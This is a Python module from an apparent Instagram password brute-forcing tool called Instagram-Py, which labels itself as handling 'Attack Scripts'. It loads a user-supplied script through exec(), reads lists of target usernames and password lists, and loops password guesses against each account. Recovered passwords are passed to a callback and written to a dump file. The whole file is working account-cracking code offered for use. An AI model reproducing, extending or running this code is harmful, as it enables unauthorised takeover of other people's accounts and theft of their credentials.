# The MIT License.
# Copyright (C) 2017 The Future Shell, DeathSec.
#
# @filename    : InstagramPyScript.py
# @description : Handles Instagram-Py Attack Scripts.
import os
from .InstagramPyCLI import InstagramPyCLI
from .InstagramPySession import InstagramPySession, DEFAULT_PATH
from .InstagramPyInstance import InstagramPyInstance
from .InstagramPyDumper import InstagramPyDumper
from datetime import datetime
from .AppInfo import appInfo as AppInformation


class InstagramPyScript:
    cli = InstagramPyCLI(
        appinfo=AppInformation,
        started=datetime.now(),
        verbose_level=0,
        username=''
    )
    threads = {}

    def __init__(self, script):
        self.cli.PrintHeader()
        self.cli.PrintDatetime()

        if not os.path.isfile(script):
            self.cli.ReportError(f"no script found at {script}")

        with open(script, 'r') as f:
            script_code = compile(f.read(), script, 'exec')
            self.execute_script(script_code)

    def execute_script(self, script_code):
        try:
            exec(script_code, globals())
            count = 0
            for i in usernames:
                verbose_level = i.get('verbose', 0)
                username = i['id']

                cli = InstagramPyCLI(
                    appinfo=AppInformation,
                    started=datetime.now(),
                    verbose_level=verbose_level,
                    username=username
                )

                try:
                    password_list = i['password_list']
                except KeyError:
                    password_list = global_password_list

                session = InstagramPySession(
                    username,
                    password_list,
                    DEFAULT_PATH,
                    DEFAULT_PATH,
                    cli
                )

                try:
                    session.ReadSaveFile(i['countinue'])
                except:
                    session.ReadSaveFile(False)

                instance = InstagramPyInstance(cli, session)
                self.threads[count] = {
                    "terminated": False,
                    "instance": instance,
                    "callback": i.get('callback', global_callback)
                }
                count += 1
        except Exception as e:
            self.cli.ReportError(f"invalid script :: {e}")

        # Finished Parsing the Custom Attack Script, Start The Attack.
        self.no_of_threads = len(self.threads)
        while self.no_of_threads:
            for i in self.threads:
                if self.threads[i]['terminated']:
                    continue
                elif self.threads[i]['instance'].PasswordFound():
                    self.handle_password_found(i)
                else:
                    self.threads[i]['instance'].TryPassword()

    def handle_password_found(self, i):
        if self.threads[i]['callback']:
            self.threads[i]['callback'](
                self.threads[i]['instance'].session.username,
                self.threads[i]['instance'].session.CurrentPassword()
            )

        self.threads[i]['instance'].session.WriteDumpFile(
            {
                "id": self.threads[i]['instance'].session.username,
                "password": self.threads[i]['instance'].session.CurrentPassword(),
                "started": str(self.threads[i]['instance'].cli.started)
            }
        )

        self.threads[i]['terminated'] = True
        self.no_of_threads -= 1

